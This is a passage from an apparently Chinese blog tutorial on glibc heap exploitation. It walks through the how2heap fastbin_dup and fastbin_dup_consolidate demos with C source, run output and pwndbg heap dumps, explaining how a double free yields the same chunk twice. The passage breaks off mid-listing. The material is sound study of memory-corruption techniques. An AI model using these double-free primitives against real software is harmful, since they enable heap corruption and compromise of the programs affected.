+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs llvm">This file demonstrates a simple <span class="hljs-type">double</span>-<span class="hljs-keyword">free</span> attack with fastbins.<br>Allocating <span class="hljs-number">3</span> buffers.<br><span class="hljs-number">1</span>st <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07010</span><br><span class="hljs-number">2</span>nd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07030</span><br><span class="hljs-number">3</span>rd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07050</span><br>Freeing the first <span class="hljs-keyword">one</span>...<br>If we <span class="hljs-keyword">free</span> <span class="hljs-number">0xd07010</span> again<span class="hljs-punctuation">,</span> things will crash because <span class="hljs-number">0xd07010</span> is at the top of the <span class="hljs-keyword">free</span> list.<br>So<span class="hljs-punctuation">,</span> instead<span class="hljs-punctuation">,</span> we&#x27;ll <span class="hljs-keyword">free</span> <span class="hljs-number">0xd07030</span>.<br>Now<span class="hljs-punctuation">,</span> we can <span class="hljs-keyword">free</span> <span class="hljs-number">0xd07010</span> again<span class="hljs-punctuation">,</span> since it&#x27;s not the head of the <span class="hljs-keyword">free</span> list.<br>Now the <span class="hljs-keyword">free</span> list has [ <span class="hljs-number">0xd07010</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0xd07030</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0xd07010</span> ]. If we <span class="hljs-keyword">malloc</span> <span class="hljs-number">3</span> times<span class="hljs-punctuation">,</span> we&#x27;ll get <span class="hljs-number">0xd07010</span> twice!<br><span class="hljs-number">1</span>st <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07010</span><br><span class="hljs-number">2</span>nd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07030</span><br><span class="hljs-number">3</span>rd <span class="hljs-keyword">malloc</span>(<span class="hljs-number">8</span>): <span class="hljs-number">0xd07010</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="关键部分调试-1"><a href="#关键部分调试-1" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>这里我们一共下4个断点,分别在每次free前和最后分配的时候</p>
+<p>首先看看没free前的堆</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602040</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20fa1</span><br>&#125;<br><span class="hljs-number">0x602060</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135073</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到一共三块空间a,b,c<br>然后我们先free a</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure>
+
+<p>然后free b</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x602020 —▸ <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再free a</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x602020 ◂— <span class="hljs-number">0</span>x602000<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到已经构成了一个chunk 环即a-&gt;b-&gt;a,然后我们再分配空间</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3rd</span> malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0</span>x602010\n0x602010, <span class="hljs-number">0</span>x602030, <span class="hljs-number">0</span>x602010 ]. If we malloc <span class="hljs-number">3</span> times, we&#x27;ll get <span class="hljs-number">0</span>x602010 twice!\<br></code></pre></td></tr></table></figure>
+
+<p>成功分配了两次a的空间</p>
+<p><em>注:这里要注意mem内存指针和chunk指针不一样,mem内存指针也就是给用户的内存指针,并不是chunk头指针</em></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序先malloc了三块内存a,b,c</p>
+<p>然后先释放a,再释放b,最后再释放一次a</p>
+<p>此时的free list为a-&gt;b-&gt;a</p>
+<p>然后再malloc3次分配到了a,b,a的内存,此时我们就得到了两次a的内存,修改其中任意一个就会影响另一块,这也就是double free的攻击demo了</p>
+<p>而fastbin 的 double free为什么能成功呢?</p>
+<p>这里借用<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/">ctf-wiki</a>的一段话:</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sqf">fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。<br><br><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">__builtin_expect</span> (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-built_in">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以只要不是连续释放同一个堆块即可,想要验证的同学可以把文中注释掉free(a)的那一行取消注释编译运行一下:-)</p>
+<h1 id="0x03-fastbin-dup-consolidate"><a href="#0x03-fastbin-dup-consolidate" class="headerlink" title="0x03 fastbin_dup_consolidate"></a>0x03 fastbin_dup_consolidate</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-type">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now free p1!\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br><br>  <span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>  <span class="hljs-comment">//分配一个large bin来触发malloc_consolidate函数</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>  <span class="hljs-comment">//通过malloc_consolidate函数我们可以把free掉的p1移动到unsorted bin中</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  ##然后就可以触发<span class="hljs-type">double</span> free漏洞了<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Trigger the double free vulnerability!\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);<br>  <span class="hljs-comment">//现在p1既在unsorted bin中又在fastbin中,因此我们再分配两次p1大小的内存,就可以分配到同一款内存</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">Allocated two fastbins: p1=0x14ba010 p2=0x14ba060<br>Now free p1!<br>Allocated large bin to trigger malloc_consolidate(): p3=0x14ba0b0<br>In malloc_consolidate(), p1 is moved to the unsorted bin.<br>Trigger the<span class="hljs-built_in"> double </span>free vulnerability!<br>We can pass the<span class="hljs-built_in"> check </span>in malloc() since p1 is<span class="hljs-built_in"> not </span>fast top.<br>Now p1 is in unsorted bin<span class="hljs-built_in"> and </span>fast bin. So we&#x27;will get it twice: 0x14ba010 0x14ba010<br></code></pre></td></tr></table></figure>
+
+<h2 id="关键部分调试-2"><a href="#关键部分调试-2" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><h3 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h3><p>这里我们把断点下在第一次free p1 ,malloc p3,第二次free p1和最后的分配内存部分,也就是</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Line</span> number <span class="hljs-number">20</span> out of range; glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c has <span class="hljs-number">19</span> lines.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">11</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">1</span> at <span class="hljs-number">0</span>x4006b6: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">11</span>.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">13</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">2</span> at <span class="hljs-number">0</span>x4006c4: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">13</span>.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">16</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">3</span> at <span class="hljs-number">0</span>x40070b: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">16</span>.<br><span class="hljs-attribute">pwndbg</span>&gt; b <span class="hljs-number">19</span><br><span class="hljs-attribute">Breakpoint</span> <span class="hljs-number">4</span> at <span class="hljs-number">0</span>x400782: file glibc_2.<span class="hljs-number">25</span>/fastbin_dup_consolidate.c, line <span class="hljs-number">19</span>.<br></code></pre></td></tr></table></figure>
+
+<p>之后我们运行一下</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x602050 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6020a0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">135009</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>可以看到此时的p1被放到了fastbin中,然后我们malloc一个0x400的大chunk,这样就会触发malloc_consolidate()</p>
+<p>此时的堆</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bb8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bb8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x602050 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6020a0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">1041</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6024b0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">133969</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1bb8 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span>) ◂— <span class="hljs-number">0</span>x602000<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>这个时候,我们之前free掉的chunk已经被放进了small bin中</p>
+<h3 id="part-2"><a href="#part-2" class="headerlink" title="part 2"></a>part 2</h3><p><strong>划重点,这个过程中到底发生了什么呢?</strong></p>
+<ol>
+<li>问题一:啥是malloc_consolidate函数??</li>
+</ol>
+<p>我们直接看源代码吧</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 